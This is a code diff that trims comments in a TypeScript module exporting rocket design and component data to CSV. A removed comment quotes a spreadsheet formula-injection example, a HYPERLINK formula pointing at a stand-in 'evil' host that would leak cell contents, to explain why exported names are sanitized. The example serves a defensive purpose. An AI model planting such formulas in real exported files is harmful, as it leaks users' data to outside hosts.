@@ -12,48 +12,17 @@ import { partLabel } from '../../i18n/format';
 import { chargeName } from '../flight/recoveryCharges';
 import { effectiveBay } from '../flight/recoveryBays';
 
-/**
- * Design-info CSV export: the same Scope / Field / Value / Unit layout
- * OpenRocket writes: a Design block, the whole-Rocket summary, one block per
- * stage, then each fin set's axial position. Field names are stable English
- * data identifiers (not localized), except that a fin set's position rows, on a
- * stage with more than one fin set, open with the part's label: its own name,
- * or for an unnamed one its type's name in the UI language. Values are in the
- * units the user has chosen, which every row names in its own Unit column.
- * Values use '.' as the decimal separator regardless of locale.
- */
+// Field names are stable English identifiers, never localized; values use '.' regardless of locale.
 
-/** Number → clean string with a fixed max decimals and a '.' decimal point. */
 const round = (v: number, d: number): string => plainDecimal(v, d);
 
-/**
- * An SI figure in the chosen unit, to six significant figures. A fixed count of
- * decimals is wrong in one unit or another: three decimals write a 0.5 mm wall
- * in meters as 0.001. A figure the kernel could not give is a blank cell, as in
- * every CSV the app writes, never the UI's no-value glyph in a numeric column.
- */
+// Significant figures: fixed decimals would write a 0.5 mm wall in meters as 0.001.
 const fig = (q: Quantity, symbol: string, si: number): string => plainSig(siToUi(q, symbol, si), 6);
 
-/**
- * RFC-4180 cell, with spreadsheet formula injection neutralized by the rule
- * every CSV writer shares (`csvField`).
- *
- * Values here are file-sourced: `model.name` is the `<name>` of an imported
- * `.ork` and the fin-set and part labels are its node names. A rocket named
- * `=HYPERLINK("http://evil/?"&A1,"Open")`, or `x;=HYPERLINK(...)` read in a
- * locale that splits on `;`, would otherwise execute when the exported CSV is
- * opened in Excel or Sheets. Figures go through the same function and stay
- * numeric, negatives included.
- *
- * A lone `\r` is quoted too: the file's own terminator is `\r\n`, so an
- * unquoted bare CR inside a name splits the record for RFC-4180 readers.
- */
+// Security: names come from imported .ork files; csvField neutralizes formula injection.
 const cell = (s: string): string => csvField(s);
 
-/** [field, value, unit] rows for one summary, in the user's units. */
 function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, string][] {
-  // `fig`, not the locale-aware formatter: this is a data file, and its
-  // decimal separator must not move with the UI language.
   const len = (si: number): [string, string] => [fig('length', units.length, si), units.length];
   const mass = (si: number): [string, string] => [fig('mass', units.mass, si), units.mass];
   const cellFor = (key: StatKey, v: number): [string, string] => {
@@ -73,23 +42,15 @@ function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, s
         return [round(v, 2), '/rad'];
       case 'pitchInertia':
       case 'rollInertia':
-        // Significant figures, not fixed decimals: a small rocket's roll inertia
-        // is around 1e-7 kg·m², which six decimals would write as 0.
         return [plainSig(v, 4), 'kg·m²'];
       default:
         return len(v);
     }
   };
-  // Which rows exist is staticInfoRows' call, shared with the .ork and the PDF.
   return staticInfoRows(info).map(({ key, field, value }) => [field, ...cellFor(key, value)]);
 }
 
-/**
- * The desktop's label for each design type (core messages.properties,
- * `DesignType.*`), keyed by the token with its underscores removed, which is
- * how the desktop stores it and how this app's tokens compare to it. This file
- * is English throughout, so the label is too.
- */
+// Desktop messages.properties DesignType.*, keyed by the token without underscores.
 const DESIGN_TYPE_LABEL: Record<string, string> = {
   original: 'Original Design/Other',
   commercialkit: 'Commercial Kit',
@@ -100,11 +61,9 @@ const DESIGN_TYPE_LABEL: Record<string, string> = {
   kitbash: 'Kit Bash of Commercial Kits',
 };
 
-/** A design type token as the desktop names it; an unknown token is shown as it is. */
 const designTypeLabel = (token: string | undefined): string =>
   token ? (DESIGN_TYPE_LABEL[token.toLowerCase().replace(/_/g, '')] ?? token) : DESIGN_TYPE_LABEL['original']!;
 
-/** The full design-info CSV as a string. */
 export function buildDesignCsv(model: ReportModel, units: UnitSelection): string {
   const lines: string[] = ['Scope,Field,Value,Unit'];
   const push = (scope: string, field: string, value: string, unit: string) =>
@@ -120,19 +79,13 @@ export function buildDesignCsv(model: ReportModel, units: UnitSelection): string
 
   for (const st of model.finSetsByStage) {
     for (const s of st.sets) {
-      // The field stays an English identifier; the part's name in it is the
-      // part's own, or its type's name for an unnamed one.
       const label = st.sets.length > 1 ? `${partLabel(i18n.t, s)}: ` : 'Fin set: ';
       push(st.stage, `${label}Nose to top of fin root`, fig('length', units.length, s.topX), units.length);
       push(st.stage, `${label}Nose to bottom of fin root`, fig('length', units.length, s.bottomX), units.length);
     }
   }
 
-  // The charges the design saves, under the names it saves them by. A charge
-  // with no backup (or no primary) is a blank Value, not a missing row, so a
-  // sheet reading by field finds every row in every file. A role flown from
-  // more than one bay names the bay in each field, or two rows would share it:
-  // its stage and its tube.
+  // A missing charge is a blank Value, not a missing row, so every file has every field.
   const charges = model.charges ?? [];
   const where = (stageName: string | undefined, tube: string) =>
     stageName === undefined ? tube : `${partLabel(i18n.t, { name: stageName, type: 'stage' })}: ${tube}`;
@@ -151,9 +104,6 @@ export function buildDesignCsv(model: ReportModel, units: UnitSelection): string
     push('Recovery charges', field(`${chargeName(r.role, false)} bay`), where(r.stageName, r.tubeName), '');
   }
 
-  // Each bay that keeps a record: its settings, then its ground tests, oldest
-  // first, numbered. The result is the log's own word for it, an identifier
-  // like the field names, not the UI's translation.
   for (const bay of model.bays ?? []) {
     const scope = where(bay.stageName, `${bay.role === 'main' ? 'Main' : 'Drogue'} bay`);
     const s = effectiveBay(bay);
@@ -178,18 +128,8 @@ export function buildDesignCsv(model: ReportModel, units: UnitSelection): string
   return lines.join('\r\n') + '\r\n';
 }
 
-/** The component table's density columns, in order: bulk, surface, line. */
 const DENSITY_KINDS: readonly MaterialDensity[] = ['density', 'surfaceDensity', 'lineDensity'];
 
-/**
- * The component table: one row per part, stage by stage in tree order, with the
- * figures the PDF's parts list shows. Diameters rather than radii, the way the
- * desktop's dialogs give them; every value in the user's units, which the header
- * names. A figure a part does not have is left blank.
- *
- * `partName` turns a part type into the reader's word for it; it is passed in
- * because this service has no translator.
- */
 export function buildComponentCsv(
   model: ReportModel,
   units: UnitSelection,
@@ -225,7 +165,6 @@ export function buildComponentCsv(
           cell(partName(p.type)),
           cell(p.name),
           cell(p.material ?? ''),
-          // One column per kind of density, so each column has one unit.
           ...DENSITY_KINDS.map((k) =>
             p.density == null || (p.densityKind ?? 'density') !== k ? '' : fig(k, units[k], p.density),
           ),
@@ -243,7 +182,6 @@ export function buildComponentCsv(
   return lines.join('\r\n') + '\r\n';
 }
 
-/** Build and download the component table. */
 export function downloadComponentCsv(
   model: ReportModel,
   units: UnitSelection,
@@ -252,7 +190,6 @@ export function downloadComponentCsv(
   void saveText(buildComponentCsv(model, units, partName), exportFilename([model.name, 'parts'], 'csv'), CSV_MIME);
 }
 
-/** Build and download the design-info CSV. */
 export function downloadDesignCsv(model: ReportModel, units: UnitSelection): void {
   void saveText(buildDesignCsv(model, units), exportFilename([model.name, 'design'], 'csv'), CSV_MIME);
 }
